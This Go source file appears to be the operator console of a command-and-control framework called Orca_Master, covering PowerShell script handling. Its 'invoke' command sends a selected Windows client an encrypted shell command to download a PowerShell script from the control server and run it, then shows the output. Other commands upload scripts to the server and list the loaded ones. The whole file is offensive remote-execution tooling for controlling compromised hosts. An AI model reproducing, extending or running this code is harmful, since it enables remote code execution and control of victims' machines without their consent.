package controller

import (
	"Orca_Master/cli/cmdopt/fileopt"
	"Orca_Master/cli/cmdopt/powershellopt"
	"Orca_Master/cli/cmdopt/shellopt"
	"Orca_Master/cli/common"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/config"
	"Orca_Master/define/retcode"
	"Orca_Master/tools/crypto"
	"encoding/json"
	"fmt"
	"github.com/desertbit/grumble"
	"path/filepath"
	"strings"
	"time"
)

var powershellCmd = &grumble.Command{
	Name:  "powershell",
	Help:  "manage powershell script",
	Usage: "powershell list|load|invoke [-h | --help]",
}

var powershellLoadCmd = &grumble.Command{
	Name: "load",
	Help: "upload powershell to server",
	Args: func(a *grumble.Args) {
		a.String("script", "powershell script name")
	},
	Usage: "powershell load [-h | --help] <file>",
	Completer: func(prefix string, args []string) []string {
		var powershellNames []string
		yamlFile, _ := filepath.Abs("3rd_party/windows/powershell/powershell.yaml")
		powershellYaml := powershellopt.ReadYamlFile(yamlFile)
		for _, powershellStruct := range powershellYaml.PowershellStructs {
			powershellNames = append(powershellNames, powershellStruct.Name)
		}
		if len(args) == 0 {
			return filterStringWithPrefix(powershellNames, prefix)
		}
		return []string{}
	},
	Run: func(c *grumble.Context) error {
		var scriptPath string
		yamlFile, _ := filepath.Abs("3rd_party/windows/powershell/powershell.yaml")
		powershellYaml := powershellopt.ReadYamlFile(yamlFile)
		scriptName := c.Args.String("script")
		scriptName = strings.TrimSpace(scriptName)
		file := powershellopt.GetPowershellFileName(scriptName, powershellYaml.PowershellStructs)
		if file == "" {
			file = scriptName
		}
		if filepath.IsAbs(file) {
			scriptPath = file
		} else {
			scriptPath, _ = filepath.Abs("3rd_party/windows/powershell/" + file)
		}

		if !fileopt.IsLocalFileLegal(scriptPath) {
			return nil
		}
		// 发送文件元信息
		_, uploadFile := filepath.Split(file)
		data := fileopt.GetFileMetaInfo(scriptPath, "powershell/"+uploadFile)
		retData := fileopt.SendFileMetaMsg("Server", data, "fileUpload")
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "file upload failed")
			return nil
		}
		// 分片发送文件
		fileopt.SendFileData("Server", scriptPath)
		// 接收消息，显示是否发送成功
		select {
		case msg := <-common.DefaultMsgChan:
			outputMsg, _ := crypto.Decrypt(common.GetHttpRetData(msg), []byte(config.AesKey))
			fmt.Println(outputMsg)
		case <-time.After(10 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
			return nil
		}
		return nil
	},
}

var powershellListCmd = &grumble.Command{
	Name:  "list",
	Help:  "list powershell scripts or options",
	Usage: "powershell list script|option [-h | --help]",
}

var powershellListScriptsCmd = &grumble.Command{
	Name:  "scripts",
	Help:  "manage powershell script",
	Usage: "powershell list scripts [-h | --help]",
	Run: func(c *grumble.Context) error {
		yamlFile, _ := filepath.Abs("3rd_party/windows/powershell/powershell.yaml")
		powershellYaml := powershellopt.ReadYamlFile(yamlFile)
		powershellLoadeds := powershellopt.InitPowershellLoaded(powershellYaml)
		marshal, err := json.Marshal(powershellLoadeds)
		if err != nil {
			return err
		}
		// 发送消息
		msg := "powershellList"
		data, _ := crypto.Encrypt(marshal, []byte(config.AesKey))
		common.SendSuccessMsg("Server", common.ClientId, msg, data)
		// 接收消息，显示已加载的程序集
		select {
		case msg := <-common.DefaultMsgChan:
			powershellLoadeds = powershellopt.GetPowershellLoadeds(msg)
			for _, ld := range powershellLoadeds {
				for i, _ := range powershellYaml.PowershellStructs {
					if powershellYaml.PowershellStructs[i].Name == ld.Name {
						powershellYaml.PowershellStructs[i].Loaded = ld.Loaded
					}
				}
			}
			powershellopt.PrintScriptsTable(powershellYaml)
		case <-time.After(10 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
			return nil
		}
		return nil
	},
}

var powershellListOptionsCmd = &grumble.Command{
	Name:  "options",
	Help:  "manage powershell options",
	Usage: "powershell list options [-h | --help]  <script_name>",
	Completer: func(prefix string, args []string) []string {
		var powershellNames []string
		yamlFile, _ := filepath.Abs("3rd_party/windows/powershell/powershell.yaml")
		powershellYaml := powershellopt.ReadYamlFile(yamlFile)
		for _, powershellStruct := range powershellYaml.PowershellStructs {
			powershellNames = append(powershellNames, powershellStruct.Name)
		}
		if len(args) == 0 {
			return filterStringWithPrefix(powershellNames, prefix)
		}
		return []string{}
	},
	Args: func(a *grumble.Args) {
		a.String("scriptName", "powershell script name")
	},
	Run: func(c *grumble.Context) error {
		yamlFile, _ := filepath.Abs("3rd_party/windows/powershell/powershell.yaml")
		powershellYaml := powershellopt.ReadYamlFile(yamlFile)
		scriptName := c.Args.String("scriptName")
		powershellopt.PrintOptionsTable(powershellYaml, scriptName)
		return nil
	},
}

var powershellInvokeCmd = &grumble.Command{
	Name:  "invoke",
	Help:  "invoke powershell script",
	Usage: "powershell invoke [-h | --help] <param>",
	Flags: func(f *grumble.Flags) {
		f.Int("t", "timeout", 1, "timeout (s)")
	},
	Args: func(a *grumble.Args) {
		a.StringList("param", "powershell parameters")
	},
	Completer: func(prefix string, args []string) []string {
		var powershellNames []string
		yamlFile, _ := filepath.Abs("3rd_party/windows/powershell/powershell.yaml")
		powershellYaml := powershellopt.ReadYamlFile(yamlFile)
		powershellLoadeds := powershellopt.InitPowershellLoaded(powershellYaml)
		marshal, _ := json.Marshal(powershellLoadeds)
		// 发送消息
		msg := "powershellList"
		data, _ := crypto.Encrypt(marshal, []byte(config.AesKey))
		common.SendSuccessMsg("Server", common.ClientId, msg, data)
		// 接收消息，显示已加载的程序集
		select {
		case msg := <-common.DefaultMsgChan:
			powershellLoadeds = powershellopt.GetPowershellLoadeds(msg)
			for _, ld := range powershellLoadeds {
				if ld.Loaded {
					powershellNames = append(powershellNames, ld.Name)
				}
			}
		case <-time.After(5 * time.Second):
			return nil
		}

		if len(args) == 0 {
			return filterStringWithPrefix(powershellNames, prefix)
		}
		return []string{}
	},
	Run: func(c *grumble.Context) error {
		if SelectId == -1 {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please select the id first")
			return nil
		}
		if SelectVer[:7] != "windows" {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "this feature only support windows system")
			return nil
		}
		timeout := c.Flags.Int("timeout")
		args := c.Args.StringList("param")
		if len(args) == 0 {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "Please enter the parameters of the powershell")
			return nil
		}
		initCmd := strings.Join(args, " ")
		yamlFile, _ := filepath.Abs("3rd_party/windows/powershell/powershell.yaml")
		powershellYaml := powershellopt.ReadYamlFile(yamlFile)
		file := powershellopt.GetPowershellFileName(args[0], powershellYaml.PowershellStructs)
		if file == "" {
			_, file = filepath.Split(args[0])
		}
		url := fmt.Sprintf("http://$host$/files/powershell/%s", file)
		cmdStr := powershellopt.PowershellCmdParse(powershellYaml, initCmd, url)
		retData := powershellopt.SendExecShellMsg(SelectClientId, cmdStr)
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "powershell request failed")
			return nil
		}
		// 从管道中接收消息，并打印
		select {
		case msg := <-common.ExecShellMsgChan:
			shellopt.PrintShellOutput(msg)
		case <-time.After(time.Duration(10+timeout) * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
			return nil
		}
		return nil
	},
}
